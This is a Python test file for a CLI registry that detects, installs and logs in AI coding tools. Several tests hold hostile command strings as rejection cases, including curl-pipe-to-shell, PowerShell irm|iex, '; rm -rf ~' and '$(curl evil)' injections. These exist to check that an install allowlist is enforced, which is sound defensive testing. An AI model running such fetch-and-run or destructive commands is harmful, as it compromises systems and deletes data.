"""Contract tests for the Universal CLI Registry (``presets/cli_registry.json`` + ``vibebaton.cli_registry``).

Shared contract (M1 workers: copy these shapes exactly; ``tests/test_guided_api.py`` uses the same ones)

    presets/cli_registry.json
        {"schema_version": 1, "tags": [CliTag, ...], "drivers": [CliDriver, ...]}
        CliTag    = {id, label_en, label_zh, summary_en, summary_zh}          # ids: "official", "community"
        CliDriver = {id, name, tier: "official"|"community", binary, summary_en, summary_zh,
                     prereq: ["node"|"python"|"git", ...], install_cmd: argv, login_cmd: argv,
                     official_url, command_template: argv, version_cmd: argv,
                     provider_ids: [VibeBaton provider id, ...], env_keys: [ENV_NAME, ...],
                     auth_check_cmd?: argv | null}
        argv = non-empty list[str], no shell metacharacters; install_cmd starts with an
        ALLOWED_INSTALL_PREFIXES entry. The ``claude`` entry is the golden example.

    scan_host_clis(...)          -> CliScanResult
        {drivers: [CliScanEntry], http_api_keys_present: [ENV_NAME], scanned_at: float}
        CliScanEntry = {id, status: "ready"|"installed_unauthenticated"|"missing"|"prereq_missing",
                        binary_path: str|null, version: str|null, prereq_missing: [prereq id],
                        reason_en, reason_zh}
    build_recommended_lineup(scan, cfg) -> RecommendedLineup
        {ready: bool, roles: {role_name: provider_id}, source: "cli"|"http"|"mixed", notes_en, notes_zh}
    run_cli_install(id, confirmed)  -> {id, ok, command: registry install_cmd, returncode, output}
        confirmed=False -> PermissionError; unknown id -> KeyError
    launch_cli_login(id)            -> {id, launched, command: registry login_cmd, message_en, message_zh}
        unknown id -> KeyError; binary missing -> FileNotFoundError
"""

from __future__ import annotations

import ast
import copy
import json
import os
import subprocess
import sys
import tempfile
import unittest
from collections.abc import Iterator, Mapping
from contextlib import contextmanager
from pathlib import Path
from typing import Any
from unittest.mock import Mock, patch

from vibebaton import cli_registry, credentials
from vibebaton.cli_registry import (
    ALLOWED_INSTALL_PREFIXES,
    REGISTRY_PATH,
    REQUIRED_DRIVER_IDS,
    build_recommended_lineup,
    launch_cli_login,
    load_cli_registry,
    run_cli_install,
    scan_host_clis,
    validate_install_recipe,
)
from vibebaton.config import HotReloadConfig

REPO_ROOT = Path(__file__).resolve().parents[1]
EXAMPLE_CONFIG = REPO_ROOT / "baton.example.toml"
DRIVER_FIELDS = {
    "id", "name", "tier", "binary", "summary_en", "summary_zh", "prereq", "install_cmd",
    "login_cmd", "official_url", "command_template", "version_cmd", "provider_ids", "env_keys",
}
OPTIONAL_DRIVER_FIELDS = {"auth_check_cmd"}
ARGV_FIELDS = ("install_cmd", "login_cmd", "command_template", "version_cmd")
SCAN_ENTRY_FIELDS = {"id", "status", "binary_path", "version", "prereq_missing", "reason_en", "reason_zh"}
SCAN_STATUSES = {"ready", "installed_unauthenticated", "missing", "prereq_missing"}
LINEUP_FIELDS = {"ready", "roles", "source", "notes_en", "notes_zh"}
HTTP_KEY_ENVS = (*credentials.SUPPORTED_KEYS, "GEMINI_API_KEY")


def _has_cjk(text: str) -> bool:
    return any("一" <= char <= "鿿" for char in text)


@contextmanager
def fake_cli_env(
    installed: set[str] | frozenset[str] = frozenset(),
    authenticated: set[str] | frozenset[str] = frozenset(),
    install_returncode: int = 0,
) -> Iterator[dict[str, Mock]]:
    """Fake host: patch ``resolve_cli_binary`` and ``subprocess.run``/``Popen`` as seen by ``cli_registry``.

    ``installed`` lists resolvable binaries (driver binaries, prereq runtimes, installers such
    as ``npm``); they resolve to ``/fake/bin/<name>``. Fake commands are recognised by that path
    or by a bare registry/prereq binary name; anything else (e.g. ``git`` used by the server)
    is delegated to the real ``subprocess.run`` so unrelated code keeps working.
    """
    real_run = subprocess.run
    registry = load_cli_registry()
    fake_names = {driver["binary"] for driver in registry["drivers"]}
    fake_names |= {name for names in cli_registry.PREREQ_BINARIES.values() for name in names}
    fake_names |= {prefix[0] for prefix in ALLOWED_INSTALL_PREFIXES}
    fake_names -= {"git"} - set(installed)  # real git stays usable unless explicitly faked

    def resolve(binary: str) -> str | None:
        name = Path(binary).name
        return f"/fake/bin/{name}" if name in installed else None

    def tool_name(argv: Any) -> str | None:
        if not isinstance(argv, (list, tuple)) or not argv:
            return None
        head = str(argv[0])
        if head.startswith("/fake/bin/"):
            return head.removeprefix("/fake/bin/")
        return head if head in fake_names else None

    def run(argv: Any, *args: Any, **kwargs: Any) -> subprocess.CompletedProcess[str]:
        name = tool_name(argv)
        if name is None:
            return real_run(argv, *args, **kwargs)
        if name not in installed:
            raise FileNotFoundError(name)
        tail = [str(token) for token in argv[1:]]
        if tail and tail[0] == "install" or name in {"pip", "pipx", "uv", "brew", "winget"}:
            return subprocess.CompletedProcess(argv, install_returncode, "installed\n", "")
        if "--version" in tail or tail == ["version"]:
            return subprocess.CompletedProcess(argv, 0, f"{name} 9.9.9 (fake)\n", "")
        code = 0 if name in authenticated else 1
        return subprocess.CompletedProcess(argv, code, "Logged in\n" if code == 0 else "", "" if code == 0 else "Not logged in\n")

    run_mock = Mock(side_effect=run)
    popen_mock = Mock(return_value=Mock(pid=31337))
    with (
        patch.object(cli_registry, "resolve_cli_binary", side_effect=resolve) as resolve_mock,
        patch.object(cli_registry.subprocess, "run", run_mock),
        patch.object(cli_registry.subprocess, "Popen", popen_mock),
    ):
        yield {"resolve": resolve_mock, "run": run_mock, "popen": popen_mock}


def fake_calls(mock: Mock) -> list[list[str]]:
    """Return the argv of every call to a fake subprocess mock that targeted a fake binary."""
    calls = []
    for call in mock.call_args_list:
        argv = call.args[0] if call.args else call.kwargs.get("args")
        if isinstance(argv, (list, tuple)) and argv and str(argv[0]).startswith("/fake/bin/"):
            calls.append([str(token) for token in argv])
    return calls


def _write_registry(directory: str, data: Mapping[str, Any] | str) -> Path:
    path = Path(directory) / "cli_registry.json"
    path.write_text(data if isinstance(data, str) else json.dumps(data), encoding="utf-8")
    return path


class CliRegistrySchemaTests(unittest.TestCase):
    """Schema + allowlist contract. Green from M1-T1 onward."""

    def setUp(self) -> None:
        self.registry = load_cli_registry()
        self.golden = copy.deepcopy(self.registry["drivers"][0])

    def test_registry_loads(self) -> None:
        self.assertEqual(REGISTRY_PATH, REPO_ROOT / "presets" / "cli_registry.json")
        self.assertEqual(self.registry["schema_version"], 1)
        self.assertEqual(self.registry["drivers"][0]["id"], "claude")
        self.assertEqual({tag["id"] for tag in self.registry["tags"]}, {"official", "community"})
        self.assertEqual(load_cli_registry(REGISTRY_PATH), self.registry)
        self.assertEqual(load_cli_registry(str(REGISTRY_PATH)), self.registry)

    def test_golden_claude_entry(self) -> None:
        self.assertEqual(self.golden["name"], "Claude Code")
        self.assertEqual(self.golden["tier"], "official")
        self.assertEqual(self.golden["binary"], "claude")
        self.assertEqual(self.golden["prereq"], ["node"])
        self.assertEqual(self.golden["install_cmd"], ["npm", "install", "-g", "@anthropic-ai/claude-code"])
        self.assertEqual(self.golden["login_cmd"], ["claude", "auth", "login"])
        self.assertEqual(self.golden["auth_check_cmd"], ["claude", "auth", "status"])
        self.assertEqual(self.golden["version_cmd"], ["claude", "--version"])
        self.assertEqual(self.golden["provider_ids"], ["claude_sub"])
        self.assertEqual(self.golden["env_keys"], ["ANTHROPIC_API_KEY"])
        config = HotReloadConfig(EXAMPLE_CONFIG).current
        self.assertEqual(self.golden["command_template"], config.providers["claude_sub"].command)

    def test_every_driver_has_required_fields_with_argv_commands(self) -> None:
        provider_ids = set(HotReloadConfig(EXAMPLE_CONFIG).current.providers) | {
            "agy_sub", "codex_sub", "claude_sub", "dsh_opencode", "dsh_deepseek", "gemini_sub", "gemini_http", "openai_http",
        }
        for driver in self.registry["drivers"]:
            with self.subTest(driver=driver["id"]):
                self.assertLessEqual(DRIVER_FIELDS, set(driver))
                self.assertLessEqual(set(driver), DRIVER_FIELDS | OPTIONAL_DRIVER_FIELDS)
                self.assertIn(driver["tier"], ("official", "community"))
                for field in ("id", "name", "binary", "summary_en", "summary_zh", "official_url"):
                    self.assertIsInstance(driver[field], str)
                    self.assertTrue(driver[field].strip(), field)
                self.assertTrue(driver["official_url"].startswith("https://"))
                self.assertFalse(_has_cjk(driver["summary_en"]), "summary_en must be pure English")
                self.assertTrue(_has_cjk(driver["summary_zh"]), "summary_zh must contain Chinese")
                for field in ARGV_FIELDS:
                    argv = driver[field]
                    self.assertIsInstance(argv, list, field)
                    self.assertTrue(argv, field)
                    self.assertTrue(all(isinstance(token, str) and token for token in argv), field)
                self.assertTrue(validate_install_recipe(driver["install_cmd"]), driver["install_cmd"])
                self.assertEqual(driver["version_cmd"][0], driver["binary"])
                self.assertLessEqual(set(driver["prereq"]), set(cli_registry.PREREQ_BINARIES))
                self.assertTrue(driver["provider_ids"])
                self.assertLessEqual(set(driver["provider_ids"]), provider_ids)
                self.assertIsInstance(driver["env_keys"], list)
                if driver.get("auth_check_cmd") is not None:
                    self.assertEqual(driver["auth_check_cmd"][0], driver["binary"])

    def test_driver_ids_are_unique(self) -> None:
        ids = [driver["id"] for driver in self.registry["drivers"]]
        self.assertEqual(len(ids), len(set(ids)))

    def test_constants(self) -> None:
        self.assertEqual(
            REQUIRED_DRIVER_IDS, ("claude", "codex", "dsh", "gemini", "opencode", "aider", "qwen", "copilot")
        )
        self.assertEqual(
            ALLOWED_INSTALL_PREFIXES,
            (("npm",), ("npm.cmd",), ("pip",), ("pipx",), ("uv",), ("brew",), ("winget",), ("gh",)),
        )

    def test_install_allowlist_accepts_registry_recipes(self) -> None:
        self.assertTrue(validate_install_recipe(self.golden["install_cmd"]))
        for argv in (
            ["npm.cmd", "install", "-g", "@anthropic-ai/claude-code"],
            ["pipx", "install", "aider-chat"],
            ["uv", "tool", "install", "aider-chat"],
            ["winget", "install", "--id", "Example.Tool", "-e"],
            ["gh", "extension", "install", "github/gh-copilot"],
        ):
            with self.subTest(argv=argv):
                self.assertTrue(validate_install_recipe(argv))

    def test_install_allowlist_rejects_shell_strings(self) -> None:
        for argv in (
            "npm install -g @anthropic-ai/claude-code",
            ["bash", "-c", "curl -fsSL https://example.invalid/install.sh | sh"],
            ["cmd", "/c", "npm install -g @anthropic-ai/claude-code"],
            ["powershell", "-Command", "irm https://example.invalid | iex"],
            ["sh", "-c", "npm install -g x"],
            ["npm"],
            ["npm", "install", "-g", "x; rm -rf ~"],
            ["npm", "install", "-g", "x && calc"],
            ["npm", "install", "$(curl evil)"],
            ["npm", "install", "x | sh"],
            ["/usr/bin/npm", "install", "x"],
            ["NPM", "install", "x"],
            ["npm", "", "x"],
            ["npm", 1, "x"],
            ("npm", "install", "x"),
            [],
            None,
        ):
            with self.subTest(argv=argv):
                self.assertFalse(validate_install_recipe(argv))

    def test_loader_rejects_malformed_registries(self) -> None:
        def mutate(change: Any) -> dict[str, Any]:
            data: dict[str, Any] = copy.deepcopy(dict(self.registry))  # type: ignore[arg-type]
            change(data)
            return data

        def driver(field: str, value: Any) -> Any:
            return lambda data: data["drivers"][0].__setitem__(field, value)

        cases: dict[str, Any] = {
            "invalid json": "{not json",
            "root list": [],
            "schema version": mutate(lambda data: data.__setitem__("schema_version", 2)),
            "drivers missing": mutate(lambda data: data.pop("drivers")),
            "drivers empty": mutate(lambda data: data.__setitem__("drivers", [])),
            "tags not list": mutate(lambda data: data.__setitem__("tags", {})),
            "tag missing label": mutate(lambda data: data["tags"][0].pop("label_zh")),
            "driver not object": mutate(lambda data: data["drivers"].append("claude")),
            "duplicate id": mutate(lambda data: data["drivers"].append(copy.deepcopy(data["drivers"][0]))),
            "bad tier": mutate(driver("tier", "partner")),
            "empty name": mutate(driver("name", " ")),
            "url not string": mutate(driver("official_url", None)),
            "install shell string": mutate(driver("install_cmd", "npm install -g @anthropic-ai/claude-code")),
            "install not allowlisted": mutate(driver("install_cmd", ["curl", "-fsSL", "https://x.invalid"])),
            "install via bash": mutate(driver("install_cmd", ["bash", "-c", "curl https://x.invalid | sh"])),
            "login shell string": mutate(driver("login_cmd", "claude auth login")),
            "version empty argv": mutate(driver("version_cmd", [])),
            "template non-string token": mutate(driver("command_template", ["claude", 1])),
            "auth check string": mutate(driver("auth_check_cmd", "claude auth status")),
            "prereq not list": mutate(driver("prereq", "node")),
            "unknown prereq": mutate(driver("prereq", ["java"])),
            "provider ids not list": mutate(driver("provider_ids", "claude_sub")),
            "env keys missing": mutate(lambda data: data["drivers"][0].pop("env_keys")),
        }
        with tempfile.TemporaryDirectory() as directory:
            for name, data in cases.items():
                with self.subTest(case=name):
                    with self.assertRaises(ValueError):
                        load_cli_registry(_write_registry(directory, data))
            valid = mutate(driver("auth_check_cmd", None))
            self.assertIsNone(load_cli_registry(_write_registry(directory, valid))["drivers"][0]["auth_check_cmd"])

    def test_modules_import_only_stdlib_and_vibebaton(self) -> None:
        for module in ("cli_registry", "brainstorm"):
            source = (REPO_ROOT / "src" / "vibebaton" / f"{module}.py").read_text(encoding="utf-8")
            for node in ast.walk(ast.parse(source)):
                if isinstance(node, ast.Import):
                    roots = [alias.name.split(".")[0] for alias in node.names]
                elif isinstance(node, ast.ImportFrom):
                    roots = [] if node.level else [(node.module or "").split(".")[0]]
                else:
                    continue
                for root in roots:
                    with self.subTest(module=module, imported=root):
                        self.assertTrue(root == "vibebaton" or root in sys.stdlib_module_names, root)


class CliRegistryCatalogTests(unittest.TestCase):
    """Full catalog contract. Turns green with M1-T2 (the remaining drivers)."""

    def setUp(self) -> None:
        self.drivers = {driver["id"]: driver for driver in load_cli_registry()["drivers"]}

    def test_all_required_drivers_present(self) -> None:
        missing = [driver_id for driver_id in REQUIRED_DRIVER_IDS if driver_id not in self.drivers]
        self.assertEqual(missing, [], f"missing CLI drivers: {missing}")
        self.assertEqual(list(self.drivers)[: len(REQUIRED_DRIVER_IDS)], list(REQUIRED_DRIVER_IDS))

    def test_required_drivers_back_existing_providers(self) -> None:
        expected = {"claude": "claude_sub", "codex": "codex_sub", "dsh": "dsh_opencode"}
        for driver_id, provider_id in expected.items():
            with self.subTest(driver=driver_id):
                self.assertIn(driver_id, self.drivers)
                self.assertIn(provider_id, self.drivers[driver_id]["provider_ids"])

    def test_both_tiers_are_represented(self) -> None:
        self.assertEqual({driver["tier"] for driver in self.drivers.values()}, {"official", "community"})


class CliScanContractTests(unittest.TestCase):
    """Host scan contract against a faked host. Turns green with M1-T3."""

    def setUp(self) -> None:
        self.enterContext(patch.dict(os.environ))
        for key in HTTP_KEY_ENVS:
            os.environ.pop(key, None)
        self.repo = Path(self.enterContext(tempfile.TemporaryDirectory()))
        self.credentials_path = Path(self.enterContext(tempfile.TemporaryDirectory())) / "credentials.json"
        self.cfg = HotReloadConfig(EXAMPLE_CONFIG).current

    def scan(self) -> dict[str, Any]:
        result = scan_host_clis(self.repo, self.cfg, self.credentials_path)
        self.assertEqual(set(result), {"drivers", "http_api_keys_present", "scanned_at"})
        self.assertIsInstance(result["scanned_at"], float)
        self.assertEqual(
            [entry["id"] for entry in result["drivers"]],
            [driver["id"] for driver in load_cli_registry()["drivers"]],
        )
        for entry in result["drivers"]:
            with self.subTest(entry=entry["id"]):
                self.assertEqual(set(entry), SCAN_ENTRY_FIELDS)
                self.assertIn(entry["status"], SCAN_STATUSES)
                self.assertFalse(_has_cjk(entry["reason_en"]))
                self.assertTrue(_has_cjk(entry["reason_zh"]))
        return result

    @staticmethod
    def entry(result: Mapping[str, Any], driver_id: str) -> dict[str, Any]:
        return next(entry for entry in result["drivers"] if entry["id"] == driver_id)

    def test_scan_reports_ready_cli(self) -> None:
        with fake_cli_env(installed={"node", "claude"}, authenticated={"claude"}) as fakes:
            claude = self.entry(self.scan(), "claude")
        self.assertEqual(claude["status"], "ready")
        self.assertEqual(claude["binary_path"], "/fake/bin/claude")
        self.assertIn("9.9.9", claude["version"])
        self.assertEqual(claude["prereq_missing"], [])
        for call in fakes["run"].call_args_list:
            self.assertFalse(call.kwargs.get("shell", False))

    def test_scan_reports_installed_unauthenticated(self) -> None:
        with fake_cli_env(installed={"node", "claude"}):
            claude = self.entry(self.scan(), "claude")
        self.assertEqual(claude["status"], "installed_unauthenticated")
        self.assertEqual(claude["binary_path"], "/fake/bin/claude")

    def test_scan_treats_env_key_as_authenticated_only_without_auth_check(self) -> None:
        os.environ["ANTHROPIC_API_KEY"] = "sk-test"
        with fake_cli_env(installed={"node", "claude"}):
            result = self.scan()
        # claude declares auth_check_cmd, so the failing status command wins over the env key.
        self.assertEqual(self.entry(result, "claude")["status"], "installed_unauthenticated")
        self.assertIn("ANTHROPIC_API_KEY", result["http_api_keys_present"])

    def test_scan_reports_missing_and_prereq_missing(self) -> None:
        with fake_cli_env(installed={"node"}):
            self.assertEqual(self.entry(self.scan(), "claude")["status"], "missing")
        with fake_cli_env(installed=set()):
            claude = self.entry(self.scan(), "claude")
        self.assertEqual(claude["status"], "prereq_missing")
        self.assertEqual(claude["prereq_missing"], ["node"])
        self.assertIsNone(claude["binary_path"])
        self.assertIsNone(claude["version"])

    def test_scan_dsh_ready_from_local_profile_without_opencode_key(self) -> None:
        self.assertNotIn("OPENCODE_API_KEY", os.environ)
        with fake_cli_env(installed={"node", "python", "dsh"}):
            dsh = self.entry(self.scan(), "dsh")
        self.assertEqual(dsh["status"], "ready")

    def test_scan_lists_present_http_keys_without_values(self) -> None:
        os.environ["GEMINI_API_KEY"] = "gm-secret-value"
        self.credentials_path.write_text(json.dumps({"DEEPSEEK_API_KEY": "ds-secret-value"}), encoding="utf-8")
        with fake_cli_env():
            result = self.scan()
        self.assertEqual(result["http_api_keys_present"], ["DEEPSEEK_API_KEY", "GEMINI_API_KEY"])
        self.assertNotIn("secret-value", json.dumps(result))

    @staticmethod
    def fail_version(fakes: Mapping[str, Mock], name: str, stderr: str) -> None:
        """Make the fake ``<name> --version`` exit 1 with ``stderr``; other calls keep the fake host."""
        original = fakes["run"].side_effect

        def run(argv: Any, *args: Any, **kwargs: Any) -> subprocess.CompletedProcess[str]:
            if argv and str(argv[0]) == f"/fake/bin/{name}" and "--version" in argv:
                return subprocess.CompletedProcess(argv, 1, "", stderr)
            return original(argv, *args, **kwargs)

        fakes["run"].side_effect = run

    def test_scan_dsh_version_probe_is_bounded_argv(self) -> None:
        with fake_cli_env(installed={"node", "dsh"}) as fakes:
            dsh = self.entry(self.scan(), "dsh")
        self.assertEqual((dsh["status"], dsh["binary_path"]), ("ready", "/fake/bin/dsh"))
        self.assertIn("9.9.9", dsh["version"])
        version_call = next(call for call in fakes["run"].call_args_list if call.args[0] == ["/fake/bin/dsh", "--version"])
        self.assertEqual(version_call.kwargs["timeout"], 10.0)
        self.assertIs(version_call.kwargs["shell"], False)

    def test_scan_dsh_auth_error_without_key_is_unauthenticated(self) -> None:
        with fake_cli_env(installed={"node", "dsh"}) as fakes:
            self.fail_version(fakes, "dsh", "Error: 401 Unauthorized - missing API key")
            dsh = self.entry(self.scan(), "dsh")
        self.assertEqual(dsh["status"], "installed_unauthenticated")
        self.assertEqual(dsh["binary_path"], "/fake/bin/dsh")
        self.assertIsNone(dsh["version"])
        self.assertIn("not signed in", dsh["reason_en"])

    def test_scan_dsh_failing_probe_with_stored_key_is_ready(self) -> None:
        self.credentials_path.write_text(json.dumps({"OPENCODE_API_KEY": "oc-secret-value"}), encoding="utf-8")
        with fake_cli_env(installed={"node", "dsh"}) as fakes:
            self.fail_version(fakes, "dsh", "Error: 401 Unauthorized")
            result = self.scan()
        self.assertEqual(self.entry(result, "dsh")["status"], "ready")
        self.assertIn("OPENCODE_API_KEY", result["http_api_keys_present"])
        self.assertNotIn("oc-secret-value", json.dumps(result))


class RecommendedLineupContractTests(unittest.TestCase):
    """Lineup synthesis contract. Turns green with M1-T3."""

    def setUp(self) -> None:
        self.cfg = HotReloadConfig(EXAMPLE_CONFIG).current

    def scan_result(self, statuses: Mapping[str, str], keys: list[str] | None = None) -> dict[str, Any]:
        return {
            "drivers": [
                {
                    "id": driver_id, "status": status, "binary_path": None, "version": None,
                    "prereq_missing": [], "reason_en": "test", "reason_zh": "测试",
                }
                for driver_id, status in statuses.items()
            ],
            "http_api_keys_present": keys or [],
            "scanned_at": 0.0,
        }

    def assert_lineup(self, lineup: Mapping[str, Any]) -> None:
        self.assertEqual(set(lineup), LINEUP_FIELDS)
        self.assertIn(lineup["source"], ("cli", "http", "mixed"))
        self.assertFalse(_has_cjk(lineup["notes_en"]))
        self.assertTrue(_has_cjk(lineup["notes_zh"]))

    def test_single_ready_cli_covers_every_role(self) -> None:
        lineup = build_recommended_lineup(self.scan_result({"claude": "ready"}), self.cfg)  # type: ignore[arg-type]
        self.assert_lineup(lineup)
        self.assertIs(lineup["ready"], True)
        self.assertEqual(lineup["source"], "cli")
        self.assertEqual(lineup["roles"], {role: "claude_sub" for role in self.cfg.roles})

    def test_single_http_key_covers_every_role(self) -> None:
        lineup = build_recommended_lineup(
            self.scan_result({"claude": "missing"}, keys=["GEMINI_API_KEY"]), self.cfg  # type: ignore[arg-type]
        )
        self.assert_lineup(lineup)
        self.assertIs(lineup["ready"], True)
        self.assertEqual(lineup["source"], "http")
        self.assertEqual(lineup["roles"], {role: "gemini_http" for role in self.cfg.roles})

    def test_mixed_sources_keep_ready_configured_providers(self) -> None:
        lineup = build_recommended_lineup(
            self.scan_result({"claude": "ready", "codex": "installed_unauthenticated"}, keys=["GEMINI_API_KEY"]),
            self.cfg,  # type: ignore[arg-type]
        )
        self.assert_lineup(lineup)
        self.assertIs(lineup["ready"], True)
        self.assertEqual(set(lineup["roles"]), set(self.cfg.roles))
        self.assertLessEqual(set(lineup["roles"].values()), {"claude_sub", "gemini_http"})
        self.assertEqual(lineup["roles"]["tactical_planner"], "claude_sub")
        self.assertNotIn("codex_sub", lineup["roles"].values())

    def test_ready_gemini_cli_without_key_uses_gemini_sub(self) -> None:
        lineup = build_recommended_lineup(self.scan_result({"gemini": "ready"}), self.cfg)  # type: ignore[arg-type]
        self.assert_lineup(lineup)
        self.assertIs(lineup["ready"], True)
        self.assertEqual(lineup["source"], "cli")
        self.assertEqual(lineup["roles"], {role: "gemini_sub" for role in self.cfg.roles})

    def test_ready_gemini_cli_with_key_prefers_cli_provider(self) -> None:
        lineup = build_recommended_lineup(
            self.scan_result({"gemini": "ready"}, keys=["GEMINI_API_KEY"]), self.cfg  # type: ignore[arg-type]
        )
        self.assertIs(lineup["ready"], True)
        self.assertEqual(lineup["source"], "cli")
        self.assertEqual(lineup["roles"], {role: "gemini_sub" for role in self.cfg.roles})

    def test_full_host_lineup_assigns_gemini_sub_to_brainstorm_and_final_gate(self) -> None:
        lineup = build_recommended_lineup(
            self.scan_result({"claude": "ready", "codex": "ready", "dsh": "ready", "gemini": "ready"}),
            self.cfg,  # type: ignore[arg-type]
        )
        self.assertIs(lineup["ready"], True)
        self.assertEqual(lineup["roles"]["brainstorm_and_final_gate"], "gemini_sub")

    def test_full_host_with_agy_assigns_agy_sub_to_brainstorm_and_final_gate(self) -> None:
        lineup = build_recommended_lineup(
            self.scan_result({"agy": "ready", "claude": "ready", "codex": "ready", "dsh": "ready", "gemini": "ready"}),
            self.cfg,  # type: ignore[arg-type]
        )
        self.assertIs(lineup["ready"], True)
        self.assertEqual(lineup["roles"]["brainstorm_and_final_gate"], "agy_sub")

    def test_ready_opencode_alone_cannot_back_dsh_provider(self) -> None:
        # dsh_opencode runs the `dsh` binary, which an opencode-only host does not have.
        lineup = build_recommended_lineup(self.scan_result({"opencode": "ready"}), self.cfg)  # type: ignore[arg-type]
        self.assert_lineup(lineup)
        self.assertIs(lineup["ready"], False)
        self.assertEqual(lineup["roles"], {})

    def test_ready_dsh_backs_dsh_provider(self) -> None:
        lineup = build_recommended_lineup(self.scan_result({"dsh": "ready"}), self.cfg)  # type: ignore[arg-type]
        self.assertIs(lineup["ready"], True)
        self.assertEqual(lineup["roles"], {role: "dsh_opencode" for role in self.cfg.roles})

    def test_nothing_ready_returns_guidance(self) -> None:
        lineup = build_recommended_lineup(self.scan_result({"claude": "prereq_missing"}), self.cfg)  # type: ignore[arg-type]
        self.assert_lineup(lineup)
        self.assertIs(lineup["ready"], False)
        self.assertEqual(lineup["roles"], {})
        self.assertIn("GEMINI_API_KEY", lineup["notes_en"])

    def test_nothing_ready_prefers_logging_in_an_installed_cli(self) -> None:
        lineup = build_recommended_lineup(
            self.scan_result({"claude": "missing", "codex": "installed_unauthenticated"}), self.cfg  # type: ignore[arg-type]
        )
        self.assert_lineup(lineup)
        self.assertIs(lineup["ready"], False)
        self.assertIn("`codex login`", lineup["notes_en"])
        self.assertIn("`codex login`", lineup["notes_zh"])

    def test_lineup_model_overrides_resolves_gemini_http_and_gemini_sub(self) -> None:
        overrides = cli_registry.lineup_model_overrides(
            {"tactical_planner": "gemini_http", "bulk_worker": "gemini_sub"},
            self.cfg,
        )
        self.assertEqual(
            overrides,
            {
                "tactical_planner": "gemini_http:gemini-4-neon-high",
                "bulk_worker": "gemini_sub:gemini-2.5-pro",
            },
        )


class CliInstallLoginContractTests(unittest.TestCase):
    """Install/login contract. Turns green with M1-T3."""

    def setUp(self) -> None:
        self.claude = load_cli_registry()["drivers"][0]

    def test_install_requires_confirmation(self) -> None:
        with fake_cli_env(installed={"node", "npm"}) as fakes:
            with self.assertRaises(PermissionError):
                run_cli_install("claude", confirmed=False)
        self.assertEqual(fake_calls(fakes["run"]), [])

    def test_install_rejects_unknown_driver(self) -> None:
        with fake_cli_env(installed={"node", "npm"}) as fakes:
            with self.assertRaises(KeyError):
                run_cli_install("definitely-not-a-cli", confirmed=True)
        self.assertEqual(fake_calls(fakes["run"]), [])

    def test_install_runs_only_the_registry_argv(self) -> None:
        with fake_cli_env(installed={"node", "npm"}) as fakes:
            result = run_cli_install("claude", confirmed=True)
        self.assertEqual(set(result), {"id", "ok", "command", "returncode", "output"})
        self.assertEqual((result["id"], result["ok"], result["returncode"]), ("claude", True, 0))
        self.assertEqual(result["command"], self.claude["install_cmd"])
        self.assertEqual(fake_calls(fakes["run"]), [["/fake/bin/npm", *self.claude["install_cmd"][1:]]])
        self.assertFalse(fakes["run"].call_args.kwargs.get("shell", False))

    def test_install_reports_failure(self) -> None:
        with fake_cli_env(installed={"node", "npm"}, install_returncode=1):
            result = run_cli_install("claude", confirmed=True)
        self.assertIs(result["ok"], False)
        self.assertEqual(result["returncode"], 1)

    def test_rejects_registry_with_disallowed_recipe(self) -> None:
        registry = load_cli_registry()
        registry["drivers"][0]["install_cmd"] = ["bash", "-c", "curl https://x.invalid | sh"]
        with fake_cli_env(installed={"node", "npm", "bash"}) as fakes:
            with self.assertRaises(ValueError):
                run_cli_install("claude", confirmed=True, registry=registry)
        self.assertEqual(fake_calls(fakes["run"]), [])

    def test_login_launches_official_command(self) -> None:
        with fake_cli_env(installed={"node", "claude"}) as fakes:
            result = launch_cli_login("claude")
        self.assertEqual(set(result), {"id", "launched", "command", "message_en", "message_zh"})
        self.assertEqual((result["id"], result["launched"]), ("claude", True))
        self.assertEqual(result["command"], self.claude["login_cmd"])
        self.assertEqual(fake_calls(fakes["popen"]), [["/fake/bin/claude", *self.claude["login_cmd"][1:]]])
        self.assertFalse(fakes["popen"].call_args.kwargs.get("shell", False))
        self.assertTrue(_has_cjk(result["message_zh"]))

    def test_install_requires_literal_true_confirmation(self) -> None:
        with fake_cli_env(installed={"node", "npm"}) as fakes:
            for confirmed in ("yes", 1, None):
                with self.subTest(confirmed=confirmed), self.assertRaises(PermissionError):
                    run_cli_install("claude", confirmed=confirmed)  # type: ignore[arg-type]
        self.assertEqual(fake_calls(fakes["run"]), [])

    def test_install_never_accepts_caller_argv(self) -> None:
        evil = ["bash", "-c", "curl https://x.invalid | sh"]
        with fake_cli_env(installed={"node", "npm", "bash"}) as fakes:
            for kwargs in ({"command": evil}, {"argv": evil}, {"install_cmd": evil}):
                with self.subTest(kwargs=list(kwargs)), self.assertRaises(TypeError):
                    run_cli_install("claude", confirmed=True, **kwargs)  # type: ignore[call-arg]
            with self.assertRaises(KeyError):
                run_cli_install(evil, confirmed=True)  # type: ignore[arg-type]
        self.assertEqual(fakes["run"].call_args_list, [])

    def test_install_maps_unresolved_npm_to_npm_cmd_on_windows(self) -> None:
        with fake_cli_env(installed={"node"}) as fakes, patch.object(cli_registry.sys, "platform", "win32"):
            result = run_cli_install("claude", confirmed=True)
        self.assertEqual(fakes["run"].call_args.args[0], ["npm.cmd", *self.claude["install_cmd"][1:]])
        self.assertEqual((result["ok"], result["returncode"]), (False, -1))
        self.assertEqual(result["command"], self.claude["install_cmd"])

    def test_login_is_detached_and_never_waits(self) -> None:
        with fake_cli_env(installed={"node", "claude"}) as fakes:
            result = launch_cli_login("claude")
        process = fakes["popen"].return_value
        process.wait.assert_not_called()
        process.communicate.assert_not_called()
        self.assertEqual(fake_calls(fakes["run"]), [])
        kwargs = fakes["popen"].call_args.kwargs
        if sys.platform == "win32":
            self.assertEqual(kwargs["creationflags"], subprocess.CREATE_NEW_CONSOLE)
        else:
            self.assertIs(kwargs["start_new_session"], True)
        self.assertNotIn("stdin", kwargs)  # the official flow owns its own console; we never type into it
        self.assertIn(self.claude["official_url"], result["message_en"])

    def test_login_errors(self) -> None:
        with fake_cli_env(installed={"node"}):
            with self.assertRaises(KeyError):
                launch_cli_login("definitely-not-a-cli")
            with self.assertRaises(FileNotFoundError):
                launch_cli_login("claude")


if __name__ == "__main__":
    unittest.main()
